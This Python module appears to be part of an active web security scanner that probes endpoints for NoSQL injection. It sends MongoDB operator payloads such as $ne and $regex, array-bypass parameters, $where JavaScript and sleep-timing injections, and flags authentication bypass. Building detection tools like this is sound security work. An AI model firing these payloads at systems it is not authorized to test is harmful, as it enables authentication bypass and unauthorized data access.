"""
nosql_probe.py — NoSQL injection detection (MongoDB + generic).

Attack vectors:
  operator     JSON body / query param operator injection ($ne, $gt, $regex, $where)
  array_bypass URL param array syntax: param[$ne]=1
  where_js     MongoDB $where JS injection: ', $where: '1 == 1'
  timing       JS sleep injection: ';sleep(5000);' with timing delta

Detection:
  - Status 200/2xx on endpoints that returned 401/403 unauthenticated (auth bypass)
  - Response body diff vs baseline (length or content change)
  - Timing delta ≥ timing_threshold seconds

Pipeline position: after active_scanner, before desync. --active-scan gated.

Sources: PAT NoSQL Injection/Intruder/MongoDB.txt + NoSQL.txt
"""

import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode

import httpx

import payloads


# Patterns that signal NoSQL errors in response body
_NOSQL_ERRORS = re.compile(
    r"(BSONTypeError|MongoError|MongoServerError|CastError|ValidationError.*mongo|"
    r"cannot use \$|unknown operator|bad operator|invalid operator|"
    r"unexpected token.*\$|JSONParseError)",
    re.IGNORECASE,
)

# Parameters that suggest MongoDB field access
_NOSQL_PARAM_RE = re.compile(
    r"\b(filter|query|find|where|aggregate|pipeline|search|match|selector)\b",
    re.IGNORECASE,
)


@dataclass
class NoSQLFinding:
    url: str
    method: str
    param: str
    attack_type: str     # operator | array_bypass | where_js | timing | error
    payload: str
    verdict: str         # confirmed | likely
    confidence: float
    evidence: str
    response_snippet: str = ""
    timing_delta: float = 0.0

    def to_dict(self) -> dict:
        return {
            "url": self.url, "method": self.method, "param": self.param,
            "attack_type": self.attack_type, "payload": self.payload,
            "verdict": self.verdict, "confidence": round(self.confidence, 2),
            "evidence": self.evidence,
            "response_snippet": self.response_snippet[:200],
            "timing_delta": round(self.timing_delta, 2),
        }


@dataclass
class NoSQLResult:
    endpoints_tested: int = 0
    findings: list[NoSQLFinding] = field(default_factory=list)

    @property
    def confirmed(self) -> list[NoSQLFinding]:
        return [f for f in self.findings if f.verdict == "confirmed"]

    def to_dict(self) -> dict:
        return {
            "endpoints_tested": self.endpoints_tested,
            "confirmed": len(self.confirmed),
            "findings": [f.to_dict() for f in self.findings],
        }


class NoSQLProbe:
    def __init__(
        self,
        auth_headers: Optional[dict] = None,
        timeout: float = 10.0,
        timing_threshold: float = 3.0,
        http_cache=None,
    ):
        self.auth_headers = auth_headers or {}
        self.timeout = timeout
        self.timing_threshold = timing_threshold
        self.http_cache = http_cache

    async def run(self, findings, max_endpoints: int = 30) -> NoSQLResult:
        """findings: list[RequestFinding] from classifier.
        Targets endpoints with NoSQL-shaped params first, then any endpoint
        with parseable inputs (query params or JSON body) up to the cap."""
        result = NoSQLResult()
        from classifier import Cat

        # Two-tier selection: high-confidence NoSQL candidates first, then
        # broaden to any endpoint with inputs we can inject into. The narrow
        # filter (param name regex) was missing endpoints like /rest/products/search?q=
        # where the path contains "search" but the param is just "q".
        priority: list = []
        secondary: list = []
        for f in findings:
            parsed = urlparse(f.url)
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            has_nosql_param = any(_NOSQL_PARAM_RE.search(p) for p in params)
            body_has_op = bool(f.body and re.search(r'\$(?:ne|gt|lt|regex|where)', f.body or ""))
            is_injection = Cat.INJECTION in f.categories
            path_smells_nosql = bool(_NOSQL_PARAM_RE.search(parsed.path))

            if has_nosql_param or body_has_op or is_injection or path_smells_nosql:
                priority.append(f)
            elif params or f.body:
                # Anything with injectable surface — broaden coverage like
                # ActiveScanner does. NoSQL operators are cheap to fire so
                # the false-positive cost is low.
                secondary.append(f)

        # Sort secondary by score (high first) so the cap eats the best ones
        secondary.sort(key=lambda f: -getattr(f, "score", 0))
        targets = priority + secondary
        targets = targets[:max_endpoints]

        result.endpoints_tested = len(targets)
        if not targets:
            return result

        from probe_http import open_probe_client

        async with open_probe_client(
            self.http_cache,
            verify=False,
            follow_redirects=True,
            timeout=self.timeout,
            headers=self.auth_headers,
        ) as client:
            tasks = [self._probe_endpoint(client, f) for f in targets]
            all_findings = await asyncio.gather(*tasks, return_exceptions=True)

        for item in all_findings:
            if isinstance(item, list):
                result.findings.extend(item)
        return result

    async def _probe_endpoint(self, client: httpx.AsyncClient, finding) -> list[NoSQLFinding]:
        url = finding.url
        method = finding.method
        parsed = urlparse(url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        body = finding.body

        try:
            baseline = await client.request(
                method, url,
                content=body.encode() if body else None,
                headers={**self.auth_headers, "Content-Type": "application/json"} if body else self.auth_headers,
            )
            baseline_status = baseline.status_code
            baseline_len = len(baseline.content)
            baseline_time = 0.0
        except Exception:
            return []

        findings: list[NoSQLFinding] = []

        # Select an injectable param.  Priority: first param whose name smells
        # like a NoSQL field; fallback: first query param; fallback: use body.
        param = next((p for p in params if _NOSQL_PARAM_RE.search(p)), None)
        if param is None and params:
            param = next(iter(params))

        # No query params and no body → nothing to inject into; skip rather
        # than firing synthetic {"q": payload} bodies against an endpoint that
        # almost certainly won't interpret them.
        if not params and not body:
            return []

        results = await asyncio.gather(
            self._test_operator(client, url, method, param, params, body, baseline_status, baseline_len),
            self._test_array_bypass(client, url, method, param, params, body, baseline_status),
            self._test_where_js(client, url, method, param, params, body, baseline_status),
            self._test_timing(client, url, method, param, params, body),
            return_exceptions=True,
        )
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
        return findings

    async def _test_operator(self, client, url, method, param, params, body,
                              baseline_status, baseline_len) -> list[NoSQLFinding]:
        op_payloads = [
            ('{"$ne": 1}',    "operator $ne"),
            ('{"$gt": ""}',   "operator $gt"),
            ('{"$regex": ""}', "operator $regex"),
            ('{"$ne": null}', "operator $ne null"),
        ]
        for payload_str, label in op_payloads:
            probe_url, probe_body = _inject(url, params, param, payload_str, body, method, json_value=True)
            try:
                r = await client.request(
                    method, probe_url,
                    content=probe_body,
                    headers={**self.auth_headers, "Content-Type": "application/json"} if probe_body else self.auth_headers,
                )
                if _NOSQL_ERRORS.search(r.text[:2000]):
                    return [NoSQLFinding(
                        url=url, method=method, param=param or "(body)",
                        attack_type="error", payload=payload_str,
                        verdict="confirmed", confidence=0.9,
                        evidence=f"NoSQL error string triggered by {label}",
                        response_snippet=r.text[:300],
                    )]
                # Auth bypass: was 401/403, now 200
                if baseline_status in (401, 403) and r.status_code < 300:
                    return [NoSQLFinding(
                        url=url, method=method, param=param or "(body)",
                        attack_type="operator", payload=payload_str,
                        verdict="confirmed", confidence=0.92,
                        evidence=f"Auth bypass: {baseline_status} → {r.status_code} with {label}",
                        response_snippet=r.text[:300],
                    )]
                # Significant response body change
                if abs(len(r.content) - baseline_len) > max(100, baseline_len * 0.2):
                    return [NoSQLFinding(
                        url=url, method=method, param=param or "(body)",
                        attack_type="operator", payload=payload_str,
                        verdict="likely", confidence=0.6,
                        evidence=f"Response length changed {baseline_len}B → {len(r.content)}B with {label}",
                        response_snippet=r.text[:200],
                    )]
            except Exception:
                pass
        return []

    async def _test_array_bypass(self, client, url, method, param, params, body,
                                  baseline_status) -> list[NoSQLFinding]:
        if not param or method != "GET":
            return []
        # URL: param[$ne]=1
        new_params = {k: v for k, v in params.items() if k != param}
        new_params[f"{param}[$ne]"] = "1"
        from urllib.parse import urlunparse
        p = urlparse(url)
        probe_url = urlunparse(p._replace(query=urlencode(new_params)))
        try:
            r = await client.get(probe_url, headers=self.auth_headers)
            if baseline_status in (401, 403) and r.status_code < 300:
                return [NoSQLFinding(
                    url=url, method=method, param=param,
                    attack_type="array_bypass", payload=f"{param}[$ne]=1",
                    verdict="confirmed", confidence=0.9,
                    evidence=f"NoSQL array bypass: {baseline_status} → {r.status_code}",
                    response_snippet=r.text[:300],
                )]
            if _NOSQL_ERRORS.search(r.text[:2000]):
                return [NoSQLFinding(
                    url=url, method=method, param=param,
                    attack_type="array_bypass", payload=f"{param}[$ne]=1",
                    verdict="confirmed", confidence=0.88,
                    evidence="NoSQL error in array bypass response",
                    response_snippet=r.text[:300],
                )]
        except Exception:
            pass
        return []

    async def _test_where_js(self, client, url, method, param, params, body,
                              baseline_status) -> list[NoSQLFinding]:
        where_payloads = [p for p in payloads.nosql_mongodb() if "$where" in p or "sleep" in p][:5]
        for payload_str in where_payloads:
            probe_url, probe_body = _inject(url, params, param, payload_str, body, method)
            try:
                r = await client.request(
                    method, probe_url,
                    content=probe_body,
                    headers={**self.auth_headers, "Content-Type": "application/json"} if probe_body else self.auth_headers,
                )
                if _NOSQL_ERRORS.search(r.text[:2000]):
                    return [NoSQLFinding(
                        url=url, method=method, param=param or "(body)",
                        attack_type="where_js", payload=payload_str,
                        verdict="confirmed", confidence=0.88,
                        evidence="NoSQL $where JS injection triggered error",
                        response_snippet=r.text[:300],
                    )]
                if baseline_status in (401, 403) and r.status_code < 300:
                    return [NoSQLFinding(
                        url=url, method=method, param=param or "(body)",
                        attack_type="where_js", payload=payload_str,
                        verdict="confirmed", confidence=0.85,
                        evidence=f"$where auth bypass: {baseline_status} → {r.status_code}",
                        response_snippet=r.text[:300],
                    )]
            except Exception:
                pass
        return []

    async def _test_timing(self, client, url, method, param, params, body) -> list[NoSQLFinding]:
        time_payloads = [p for p in payloads.nosql_general() if "sleep" in p.lower()][:3]
        for payload_str in time_payloads:
            probe_url, probe_body = _inject(url, params, param, payload_str, body, method)
            t0 = time.monotonic()
            try:
                await client.request(
                    method, probe_url,
                    content=probe_body,
                    headers={**self.auth_headers, "Content-Type": "application/json"} if probe_body else self.auth_headers,
                    timeout=self.timeout + 6,
                )
                elapsed = time.monotonic() - t0
                if elapsed >= self.timing_threshold:
                    return [NoSQLFinding(
                        url=url, method=method, param=param or "(body)",
                        attack_type="timing", payload=payload_str,
                        verdict="likely", confidence=0.72,
                        evidence=f"NoSQL timing: response delayed {elapsed:.1f}s",
                        timing_delta=elapsed,
                    )]
            except Exception:
                pass
        return []


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _inject(
    url: str, params: dict, param: Optional[str],
    payload: str, body: Optional[str], method: str,
    json_value: bool = False,
) -> tuple[str, Optional[str]]:
    """Inject payload into the named param or JSON body."""
    from urllib.parse import urlunparse
    if param and params:
        new_params = dict(params)
        new_params[param] = payload
        p = urlparse(url)
        return urlunparse(p._replace(query=urlencode(new_params))), None
    if body:
        try:
            bd = json.loads(body)
            if param and param in bd:
                bd[param] = json.loads(payload) if json_value else payload
            else:
                key = param or next(iter(bd), "q")
                bd[key] = json.loads(payload) if json_value else payload
            return url, json.dumps(bd)
        except Exception:
            pass
    if json_value:
        key = param or "q"
        return url, json.dumps({key: json.loads(payload)})
    return url, json.dumps({param or "q": payload})
